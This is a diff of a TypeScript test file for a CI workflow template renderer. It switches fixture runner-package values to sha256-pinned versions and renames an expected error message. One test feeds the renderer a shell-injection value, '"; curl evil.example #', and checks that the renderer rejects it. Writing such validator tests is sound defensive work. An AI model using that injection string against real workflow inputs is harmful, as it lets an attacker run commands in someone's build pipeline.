@@ -45,7 +45,7 @@ import { RelayStores } from "../src/stores.js";
 
 const TEMPLATE = {
   serverOrigin: "https://norns.example",
-  runnerPackage: "@norns/runner@0.1.0",
+  runnerPackage: "0.1.0@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
 } as const;
 
 const REPOSITORY = {
@@ -216,7 +216,7 @@ describe("Norns Actions workflow template", () => {
     ).toThrow(/https origin/);
     expect(() =>
       renderNornsAgentWorkflow({ ...TEMPLATE, runnerPackage: '"; curl evil.example #' }),
-    ).toThrow(/unsafe runner package/);
+    ).toThrow(/unsafe runner tarball/);
     expect(() => renderNornsAgentWorkflow({ ...TEMPLATE, timeoutMinutes: 100_000 })).toThrow(
       /between 1 and 360/,
     );
@@ -724,7 +724,7 @@ describe("Actions-hosted scheduling extends the Phase 4 gate", () => {
       built.actions,
       {
         serverOrigin: "https://norns.example",
-        runnerPackage: "@norns/runner@0.1.0",
+        runnerPackage: "0.1.0@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
         reserveGeneration: (runnerId) => stores.reserveRunnerGeneration(runnerId),
       },
     );
